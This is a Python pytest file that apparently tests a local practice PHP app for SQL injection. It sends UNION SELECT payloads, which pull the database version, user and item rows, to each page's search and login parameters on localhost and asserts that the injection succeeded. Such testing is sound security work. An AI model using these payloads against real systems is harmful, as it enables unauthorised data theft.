# Python version: 3.11.0
from typing import Any
import pytest
import requests
from bs4 import BeautifulSoup
from pathlib import Path
import yaml
import colorama
from colorama import Fore, Back, Style

colorama.init(autoreset=True)


list_of_files = list(Path("./pages").rglob("*.php"))
# List of endpoints to test
endpoints = [file.name for file in list_of_files]
for endpoint in endpoints:
    print(endpoint, end=" ")
print("Total endpoints: ", len(endpoints))
config: dict
with open("attack_payloads.yaml", "r", encoding="utf-8") as config_file:
    config = yaml.load(config_file, Loader=yaml.FullLoader)
    # config = yaml.safe_load(config_file)


# List of payloads to test
payloads = [
    "' UNION SELECT 1, VERSION() -- ",
    "' UNION SELECT 1, USER() -- ",
    "' UNION SELECT NULL, NULL, name, price FROM items; --",
    "' UNION SELECT NULL,@@version, NULL, NULL; --",
    "' UNION SELECT @@version, NULL, NULL; --",
    "' UNION SELECT @@version, NULL; --",
    "' UNION SELECT @@version; --",
]

# 'UNION SELECT @@version, NULL
# 'UNION%20SELECT%20%40%40version%2C%20NULL
# %' UNION SELECT 1,version(),3,4 -- -
# %' UNION SELECT 1,version()-- -
expected_values = [
    # Assuming MySQL version is 5.7.32
    "5.7.42",
    # Assuming MySQL user is root@localhost
    "root@",
    # ... you can add more expected values here ...
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
}

QUERY_PARAMS: dict = {
    "find": {
        "type": "search",
    },
    "login": {
        "type": ["user", "pass"],
    },
    "search_by_price": {
        "type": "max",
    },
    "search": {
        "type": "search",
    },
}


def get_attack_payloads_config():
    with open("attack_payloads.yaml", "r", encoding="utf-8") as _payload_file:
        _payload = yaml.load(_payload_file, Loader=yaml.FullLoader)
    return _payload


global_payload_dict: dict = get_attack_payloads_config()


def get_query_param_type(dictionary: dict, url: str) -> list:
    for key in dictionary:
        if key in url:
            return dictionary[key]["type"]
    raise ValueError(
        f"No testing type found for given route {Fore.LIGHTRED_EX + url + Fore.RESET}. Make sure that the page has either exec, echo, find, or ping in the name."
    )


def get_route_based_attack_type(dictionary: dict, url: str) -> dict:
    for key in dictionary:
        if key in url:
            return dictionary[key]
    raise ValueError(
        f"No testing type found for given route {url}. Make sure that the page has either search, search_by_price, login or find in the name."
    )


# endpoint = "find.php"
# query_type = get_query_param_type(dictionary=QUERY_PARAMS, url=endpoint)
# payload = (
#     global_payload_dict.get("find")
#     .get("functional_test")
#     .get("test_name_01")
#     .get("payload")
# )
# expected_value = (
#     global_payload_dict.get("find")
#     .get("functional_test")
#     .get("test_name_01")
#     .get("expected")
# )
# url_to_test = f"http://localhost:8000/{endpoint}?{query_type}={payload}"
# response = requests.Session().get(url_to_test, headers=headers)
# response.encoding = "utf-8"  # Ensure response is interpreted as UTF-8

# soup = BeautifulSoup(response.text, "html.parser")
# print(soup.text)
# print(expected_value)
# print(expected_value in soup.text)
# assert (
#     response.status_code == 200
# ), f"Expected status code 200, but got {response.status_code}"
# print("if 2.00 € in soup.text")
# assert expected_value in soup.text, f"Payload '{payload}' did not work"

# exit()


@pytest.fixture(scope="module")
def session():
    return requests.Session()


@pytest.mark.parametrize(
    "endpoint,test_name, payload_dict, query_type",
    [
        (
            e,
            test_name,
            attack_dict,
            get_query_param_type(dictionary=QUERY_PARAMS, url=e),
        )
        for e in endpoints
        for test_name, attack_dict in get_route_based_attack_type(
            dictionary=global_payload_dict, url=e
        )
        .get("functional_test")
        .items()
    ],
)
def test_sql_functional_test(
    session: requests.Session,
    endpoint: str,
    test_name: str,
    payload_dict: dict,
    query_type: str,
):
    url_to_test: str
    response: requests.Response
    if type(query_type) == list:
        url_to_test = f"http://localhost:8000/{endpoint}"
        response = session.post(
            url_to_test,
            headers=headers,
            data=dict(zip(query_type, payload_dict.get("payload"))),
        )
    else:
        url_to_test = f"http://localhost:8000/{endpoint}?{query_type}={payload_dict.get('payload')}"
        response = session.get(url_to_test, headers=headers)

    soup = BeautifulSoup(response.text, "html.parser")
    assert (
        response.status_code == 200
    ), f"Expected status code 200, but got {response.status_code}"

    # Check if the payload was successful
    assert (
        payload_dict["expected"]
        in soup.text
        # payload_dict.get("expected") in soup.text
    ), f"{test_name}: '{payload_dict.get('payload')}' did not work"


# # @pytest.fixture(scope="module")
# # def payload_dict():
# #     with open("payload_dict.yaml", "r") as _payload_file:
# #         _payload = yaml.load(_payload_file, Loader=yaml.FullLoader)
# #     return _payload


# @pytest.mark.parametrize(
#     "endpoint, dict_of_attacks, query_type",
#     [
#         (
#             e,
#             get_route_based_attack_type(dictionary=global_payload_dict, url=e),
#             get_query_param_type(dictionary=QUERY_PARAMS, url=e),
#         )
#         for e in endpoints
#     ],
# )
# def test_sql_error_based_injection(
#     session: requests.Session,
#     endpoint: str,
#     dict_of_attacks: dict,
#     query_type: str,
# ):
#     assert True


# # Dla
# @pytest.mark.parametrize(
#     "endpoint, payload_dict, query_type",
#     [
#         (
#             e,
#             attack_dict,
#             get_query_param_type(dictionary=QUERY_PARAMS, url=e),
#         )
#         for e in endpoints
#         for attack_dict in get_route_based_attack_type(
#             dictionary=global_payload_dict, url=e
#         ).get("union")
#     ],
# )
# def test_sql_union_injection(
#     session: requests.Session,
#     endpoint: str,
#     payload_dict: dict,
#     expected_value: str,
#     query_type: str,
# ):
#     url: str
#     response: requests.Response
#     if type(query_type) == list:
#         url = f"http://localhost:8000/{endpoint}"
#         response = session.post(
#             url,
#             headers=headers,
#             data={query_type[0]: payload, query_type[1]: payload},
#         )
#     else:
#         url = f"http://localhost:8000/{endpoint}?{query_type}={payload}"
#         response = session.get(url, headers=headers)

#     soup = BeautifulSoup(response.text, "html.parser")
#     assert (
#         response.status_code == 200
#     ), f"Expected status code 200, but got {response.status_code}"

#     # Check if the payload was successful
#     print(soup.text)
#     assert expected_value not in soup.text, f"Payload '{payload}' did not work"
